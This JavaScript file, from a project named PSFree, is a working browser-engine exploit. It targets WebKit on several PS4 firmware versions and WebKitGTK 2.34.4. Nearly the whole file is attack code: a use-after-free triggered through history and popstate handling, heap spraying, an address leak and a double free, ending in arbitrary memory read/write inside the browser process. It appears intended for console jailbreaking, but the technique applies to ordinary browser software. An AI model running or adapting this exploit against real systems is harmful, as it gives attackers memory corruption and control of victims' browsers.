/* Copyright (C) 2023 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import * as config from './config.mjs';

import {
    read32,
    read64,
    write32,
    write64,
    sread64,
} from './module/rw.mjs';

import * as offset from './module/offset.mjs';

import { Int } from './module/int64.mjs';
import { Memory } from './module/mem.mjs';

import {
    die,
    debug_log,
    clear_log,
    str2array,
} from './module/utils.mjs';

const ssv_len = (() => {
    switch (config.target) {
        case config.ps4_9_00:
        case config.gtk_2_34_4: {
            return 0x50;
        }
        case config.ps4_6_50:
        case config.ps4_8_03: {
            return 0x48;
        }
        default: {
            throw RangeError('invalid config.target: ' + config.target);
        }
    }
})();

const num_reuse = (() => {
    switch (config.target) {
        case config.gtk_2_34_4: {
            return 0x400;
        }
        case config.ps4_9_00:
        case config.ps4_6_50:
        case config.ps4_8_03: {
            return 0x4000;
        }
        default: {
            throw RangeError('invalid config.target: ' + config.target);
        }
    }
})();

// size of JSArrayBufferView
const original_strlen = ssv_len - offset.size_strimpl;
const buffer_len = 0x20;
// make sure this is large enough to ensure that enough strings will
// occupy any gaps in in the relative read area so when are trying to leak the
// JSArrayBufferView we won't hit any unmapped areas
const num_str = 0x4000;
const num_gc = 30;
const original_loc = window.location.pathname;
const loc = original_loc + '#foo';

// this variable has to be global for the leak to work
// more reliably on the ps4 8.03 for reasons we do not know
let rstr = null;
// this variable has to be global for reliability on
// both ps4 8.03 and webkitgtk 2.34.4
let view_leak_arr = [];
// these variables need to be global because we theorize
// there are optimizations between local and global variables.
// we don't know what optimizations these are but it is messing
// with us

// contents of the JSArrayBufferView
// 3rd element is the address of the buffer of the JSArrayBufferView
let jsview = [];

let ab = [];
let s1 = {};
let s2 = {};
let view_leak = null;
let view_rw = null;

let input = document.body.appendChild(document.createElement("input"));
let foo = document.body.appendChild(document.createElement("a"));
foo.id = "foo";

// The theory is that the allocator and garbage collector (GC) cooperate in
// serving allocation requests. The GC knows if there are any garbage that can
// be collected, to free up memory for requests. If the allocator can't serve a
// request, it will ask the GC to perform a garbage collection.
//
// If even after a garbage colllection, there is still no memory left for
// allocation, then the process will request the operating system to increase
// its heap size.
//
// We loop a couple of times by num_loop in allocating memory and dropping
// references to it. Even though we dropped the references immediately, memory
// consumption will still grow, since garbage is not immediately collected.
// Hopefully one of the requests will force the allocator to yield to the GC.
let pressure = null;
function gc(num_loop) {
   pressure = Array(100);
   for (let i = 0; i < num_loop; i++) {
       for (let i = 0; i < pressure.length; i++) {
           pressure[i] = new Uint32Array(0x40000);
       }
       pressure = Array(100);
   }
   pressure = null;
}

function prepare_uaf() {
    history.pushState('state0', '');
    for (let i = 0; i < 20 - 1; i++) {
        history.replaceState('state0', '');
    }
    history.replaceState("state1", "", loc);
}

function free() {
    // We replace the URL with the original so the user can rerun the exploit
    // via a reload. If we don't then the exploit will append another "#foo" to
    // the URL and the input element will not be blurred because the foo
    // element won't be scrolled to during history.back().
    history.replaceState('state3', '', original_loc);

    for (let i = 0; i < num_reuse; i++) {
        let view = new Uint8Array(new ArrayBuffer(ssv_len));
        for (let i = 0; i < view.length; i++) {
            view[i] = 0x41;
        }
        ab.push(view);
    }
}

function check_spray() {
    for (let i = 0; i < num_reuse; i++) {
        if (ab[i][0] !== 0x41) {
            return i;
        }
    }
    return null;
}

async function use_after_free(pop_func) {
    const pop_promise = new Promise((resolve) => {
        function pop_wrapper(event) {
            pop_func(event);
            resolve();
        }
        addEventListener("popstate", pop_wrapper, {once:true});
    });

    prepare_uaf();

    // Don't want any state2 near state1
    history.pushState("state2", "");
    for (let i = 0; i < 20; i++) {
        history.replaceState("state2", "");
    }

    let num_free = 0;
    function onblur() {
        if (num_free > 0)  {
            die('multiple frees');
        }
        free(ab);
        num_free++;
    }

    input.onblur = onblur;
    await new Promise((resolve) => {
        input.addEventListener('focus', resolve, {once:true});
        input.focus();
    });
    history.back();

    await pop_promise;
}

async function double_free() {
    let obj = {};
    let view = s1.ab;

    // set refcount to 1, all other fields to 0/NULL
    view[0] = 1;
    for (let i = 1; i < view.length; i++) {
        view[i] = 0;
    }

    ab = [];
    delete s1.pop;
    gc(num_gc);

    // 6.xx needs this additional sleep
    if (config.target === config.ps4_6_50) {
        await new Promise((resolve) => setTimeout(resolve, 0x80));
    }
    // log to check if the garbage collector did collect PopStateEvent
    // must not log "1, 0, 0, 0, ..."
    debug_log(view);

    debug_log('spraying StringImpl');
    for (let i = 0; i < num_str; i++) {
        let str = new String(
            'B'.repeat(original_strlen - 5)
            + i.toString().padStart(5, '0')
        );
        obj[str] = 0x1337;
    }
    debug_log('done spraying StringImpl');

    if (view[offset.strimpl_inline_str] === 0x42) {
        debug_log('leaked string');
        debug_log(view);
        write32(view, offset.strimpl_strlen, 0xffffffff);
    } else {
        die('failed string leak');
    }

    let found = false;
    let str_arr = Object.getOwnPropertyNames(obj);
    for (let i = 0; i < str_arr.length; i++) {
        if (str_arr[i].length > 0xff) {
            rstr = str_arr[i];
            found = true;
            debug_log('confirmed correct leaked');
            debug_log('str len: ' + rstr.length);
            debug_log(view);
            debug_log('read address: ' + read64(view, offset.strimpl_m_data));
            break;
        }
    }
    if (!found) {
        die('incorrect str leak');
    }

    // Spraying JSArrayBufferViews
    debug_log('spraying views');
    let buffer = new ArrayBuffer(buffer_len);
    let tmp = [];
    const num_alloc = 0x10000;
    const num_threshold = 0xfc00;
    const num_diff = num_alloc - num_threshold;
    for (let i = 0; i < num_alloc; i++) {
        // The last allocated are more likely to be allocated after our relative read
        if (i >= num_threshold) {
            view_leak_arr.push(new Uint8Array(buffer));
        } else {
            tmp.push(new Uint8Array(buffer));
        }
    }
    tmp = null;
    debug_log('done spray views');

    /*
     * Force JSC ref on FastMalloc Heap
     * https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js#L151
     */
    let props = [];
    for (let i = 0; i < num_diff; i++) {
        props.push({ value: 0x43434343 });
        props.push({ value: view_leak_arr[i] });
    }

    debug_log('start find leak');
    /*
     * /!\
     * This part must avoid as much as possible fastMalloc allocation
     * to avoid re-using the targeted object
     * /!\
     */
    // Use relative read to find our JSC obj
    // We want a JSArrayBufferView that is allocated after our relative read
    while (view_leak === null) {
        Object.defineProperties({}, props);
        for (let i = 0; i < 0x800000; i++) {
            let v = undefined;
            if (rstr.charCodeAt(i) === 0x43 &&
                rstr.charCodeAt(i + 1) === 0x43 &&
                rstr.charCodeAt(i + 2) === 0x43 &&
                rstr.charCodeAt(i + 3) === 0x43
            ) {
                // check if PropertyDescriptor
                if (rstr.charCodeAt(i + 0x08) === 0x00 &&
                    rstr.charCodeAt(i + 0x0f) === 0x00 &&
                    rstr.charCodeAt(i + 0x10) === 0x00 &&
                    rstr.charCodeAt(i + 0x17) === 0x00 &&
                    rstr.charCodeAt(i + 0x18) === 0x0e &&
                    rstr.charCodeAt(i + 0x1f) === 0x00 &&
                    rstr.charCodeAt(i + 0x28) === 0x00 &&
                    rstr.charCodeAt(i + 0x2f) === 0x00 &&
                    rstr.charCodeAt(i + 0x30) === 0x00 &&
                    rstr.charCodeAt(i + 0x37) === 0x00 &&
                    rstr.charCodeAt(i + 0x38) === 0x0e &&
                    rstr.charCodeAt(i + 0x3f) === 0x00
                ) {
                    v = str2array(rstr, 8, i + 0x20);
                // check if array of JSValues pointed by m_buffer
                } else if (rstr.charCodeAt(i + 0x10) === 0x43 &&
                    rstr.charCodeAt(i + 0x11) === 0x43 &&
                    rstr.charCodeAt(i + 0x12) === 0x43 &&
                    rstr.charCodeAt(i + 0x13) === 0x43) {
                    v = str2array(rstr, 8, i + 8);
                }
            }
            if (v !== undefined) {
                view_leak = v;
                props = null;
                str_arr = null;
                obj = null;
                break;
            }
        }
    }
    /*
     * /!\
     * Critical part ended-up here
     * /!\
     */
    debug_log('end find leak');

    view_leak = new Int(view_leak);
    debug_log('view addr ' + view_leak);

    let rstr_addr = read64(view, offset.strimpl_m_data);
    write64(view, offset.strimpl_m_data, view_leak);
    for (let i = 0; i < 4; i++) {
        jsview.push(sread64(rstr, i*8));
    }
    write64(view, offset.strimpl_m_data, rstr_addr);
    write32(view, offset.strimpl_strlen, original_strlen);
    debug_log('contents of JSArrayBufferView');
    debug_log(jsview);

    // check if the JSArrayBufferView is allocated below its buffer
    let index = view_leak.sub(jsview[2]);
    debug_log('index: ' + index);
    // check sign bit
    if (index.high() >>> 31 === 1) {
        die('view not below buffer');
    }
    if (index.high() !== 0) {
        die('index not reachable by relative r/w');
    }
}

// for ps4 and ps5
async function decrement_ps4() {
    debug_log('try decrement');
    // any of the buffers since they all share the same underlying memory
    let trick_buffer = view_leak_arr[0];
    s2.ab[0] = 1; // refcount
    for (let i = 1; i < s2.ab.length; i++) {
        s2.ab[i] = 0; // unneeded fields to NULL
    }
    // setup to trick the destructor
    write32(s2.ab, 0x44, 1);
    write64(s2.ab, 0x38, jsview[2]);
    debug_log('0x44: ' + read32(s2.ab, 0x44));
    debug_log('0x38: ' + read64(s2.ab, 0x38));
    debug_log(s2.ab);

    let target_addr =
        view_leak.add(
            offset.view_m_length
            + 1 // to misalign the decrement
        );
    write64(trick_buffer, 0, target_addr);
    debug_log('target addr: ' + target_addr);
    debug_log('check: readout addr in buffer: ' + read64(trick_buffer, 0));

    ab = null;
    delete s2.pop;
    // we lowered it from num_gc since we are crashing on the ps4
    gc(20);

    // 6.xx needs this additional sleep
    if (config.target === config.ps4_6_50) {
        await new Promise((resolve) => setTimeout(resolve, 0x80));
    }
    // log to check if the garbage collector did collect PopStateEvent
    // must not log "1, 0, 0, 0, ..."
    debug_log(s2.ab);

    debug_log('second gc');

    let found = false;
    for (let i = 0; i < view_leak_arr.length; i++) {
        let view = view_leak_arr[i];
        if (view.length > 0xff) {
            debug_log('achieved relative r/w');
            debug_log('view i: ' + i);
            debug_log('view len: ' + view.length);
            found = true;
            view_rw = view_leak_arr[i];
            break;
        }
    }
    if (!found) {
        die('no relative r/w');
    }
}

// for webkitgtk 2.34.4
// async as well to have compatible signature with decrement_ps4()
async function decrement_gtk() {
    debug_log('try decrement');
    // any of the buffers since they all share the same underlying memory
    let trick_buffer = view_leak_arr[0];
    s2.ab[0] = 1; // refcount
    for (let i = 1; i < s2.ab.length; i++) {
        s2.ab[i] = 0; // unneeded fields to NULL
    }
    // setup to trick the destructor
    write32(s2.ab, 0x34, 1);
    write64(s2.ab, 0x28, jsview[2]);
    debug_log('0x34: ' + read32(s2.ab, 0x34));
    debug_log('0x28: ' + read64(s2.ab, 0x28));
    debug_log(s2.ab);

    const offset_added_by_destructor = 8;
    let target_addr =
        view_leak.add(
            offset.view_m_length
            - offset_added_by_destructor
            + 1 // to misalign the decrement
        );
    write64(trick_buffer, 0, target_addr);
    trick_buffer[0x10] = 1;
    debug_log('target addr: ' + target_addr);
    debug_log('check: readout addr in buffer: ' + read64(trick_buffer, 0));
    debug_log('check: trick_buffer[0x10] == 1: ' + read64(trick_buffer, 0x10));

    ab = null;
    delete s2.pop;
    gc(num_gc);
    debug_log('second gc');

    let found = false;
    for (let i = 0; i < view_leak_arr.length; i++) {
        let view = view_leak_arr[i];
        if (view.length > 0xff) {
            debug_log('achieved relative r/w');
            debug_log('view i: ' + i);
            debug_log('view len: ' + view.length);
            found = true;
            view_rw = view_leak_arr[i];
            break;
        }
    }
    if (!found) {
        die('no relative r/w');
    }
}

const decrement = (() => {
    switch (config.target) {
        case config.gtk_2_34_4: {
            return decrement_gtk;
        }
        case config.ps4_9_00:
        case config.ps4_6_50:
        case config.ps4_8_03: {
            return decrement_ps4;
        }
        default: {
            throw RangeError('invalid config.target: ' + config.target);
        }
    }
})();

// get arbitrary read/write
function setup_arw() {
    let view_worker_addr = null;
    let view_worker = null;
    let worker_i = null;
    let index = view_leak.sub(jsview[2]);
    index = index.low();

    // Is the next JSObject a JSArrayBufferView? Otherwise we target the previous JSObject
    if (view_rw[index + offset.size_view + offset.view_m_length] === buffer_len) {
        view_worker_addr = view_leak.add(offset.size_view);
        worker_i = index + offset.size_view;
    } else {
        view_worker_addr = view_leak.sub(offset.size_view);
        worker_i = index - offset.size_view;
    }
    debug_log('worker i: ' + worker_i);

    // Overiding the length of one the JSArrayBufferViews with a known value
    // ensure known value != buffer_len
    view_rw[worker_i + offset.view_m_length] = 0xff;

    // Looking for the worker JSArrayBufferView
    let found = false;
    for (let i = 0; i < view_leak_arr.length; i++) {
        if (view_leak_arr[i].length === 0xff) {
            alert('achieved arbitrary r/w');
            debug_log('achieved arbitrary r/w');
            view_worker = view_leak_arr[i];
            found = true;
            break;
        }
    }
    if (!found) {
        die('no arbitrary r/w');
    }

    const mem = new Memory(
        view_rw, view_leak,
        view_worker, view_worker_addr,
        worker_i
    );

    // cleanup
    view_leak_arr = null;
    view_rw = null;
    view_leak = null;
    // during the decrement we corrupted m_mode as well, we have the original
    // m_mode here at jsview but we won't bother in fixing it since we are not
    // crashing anyway
    jsview = null;
    // the StringImpl is safe to free since we fixed it up earlier
    rstr = null;
    input = null;
    foo = null;

    // After rstrs's death and the decrement, the JSArrayBufferViews at s1 and
    // s2 will no longer have any object overlaid on their backing buffers but
    // it is still freed. Meaning we can control any object that might be
    // allocated there again. But these views are no longer needed as we
    // already have an arbitrary read/write primitive. It might be in our
    // interest to just free them as well.
    //
    // But since we have not filled the backing buffers with any object, the
    // browser might have already filled them with important objects. Freeing
    // the views will lead them to freeing their backing buffers since they
    // still think they need to and thus this will free any overlaid objects.
    //
    // So we will not free them just to be sure we won't free any important
    // objects by accident and lead to a crash.
    //s1 = null;
    //s2 = null;
}

function pop_two(event) {
    let spray_res = check_spray();
    if (spray_res === null) {
        die('failed spray round 2');
    } else {
        s2.pop = event;
        s2.ab = ab[spray_res];
        debug_log('ssv len: ' + ssv_len);
        debug_log('view index: ' + spray_res);
        debug_log(s2.ab);
    }
}

function pop_one(event) {
    let spray_res = check_spray();
    if (spray_res === null) {
        die('failed spray');
    } else {
        s1.pop = event;
        s1.ab = ab[spray_res];
        debug_log('ssv len: ' + ssv_len);
        debug_log('view index: ' + spray_res);
        debug_log(s1.ab);
    }
}

// Input elements of document.body that are focused before DOMContentLoaded
// fires will be blurred then refocused. Our input.focus() may run earlier than
// this and thus it will be blurred prematurely.
async function get_ready() {
    debug_log('readyState: ' + document.readyState);
    await new Promise((resolve, reject) => {
        if (document.readyState !== "complete") {
            document.addEventListener("DOMContentLoaded", resolve);
            return;
        }
        resolve();
    });
}

async function run() {
    debug_log('stage: readying');
    await get_ready();

    debug_log('stage: UaF 1');
    await use_after_free(pop_one);

    // We still have to wait a bit more since for some reason the garbage
    // collector can not preempt us if we ran double_free() as early as
    // possible.
    debug_log('stage: timeout 1');
    await new Promise((resolve) => setTimeout(resolve, 0x1000));

    // we trigger the leak first because it is more likely to work
    // than if it were to happen during the second ssv smashing
    // on the ps4
    debug_log('stage: double free');
    await double_free();

    debug_log('stage: UaF 2');
    await use_after_free(pop_two);

    // same reason as the above timeout
    debug_log('stage: timeout 2');
    await new Promise((resolve) => setTimeout(resolve, 0x100));

    debug_log('stage: decrement');
    await decrement();

    debug_log('stage: setup arw');
    setup_arw();
}

export async function wait_mem() {
    await run();
}
